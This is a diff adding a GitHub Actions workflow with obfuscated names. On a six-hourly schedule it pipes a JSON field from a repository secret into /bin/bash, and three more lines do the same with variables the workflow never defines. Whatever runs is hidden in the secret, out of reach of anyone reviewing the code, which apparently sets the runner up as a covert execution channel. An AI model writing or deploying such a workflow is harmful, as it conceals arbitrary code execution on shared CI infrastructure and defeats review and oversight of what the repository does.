@@ -1,0 +1,20 @@
+name: bishasx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bishasx
+        env:
+          grs3047: ${{ secrets.grs3047 }}
+        run: |
+          echo $grs3047 | jq -r .qr4023 | /bin/bash
+          echo $zd3577 | jq -r .sel925 | /bin/bash
+          echo $knmm6312 | jq -r .jhyh24 | /bin/bash
+          echo $ahnr5279 | jq -r .auui2 | /bin/bash
+
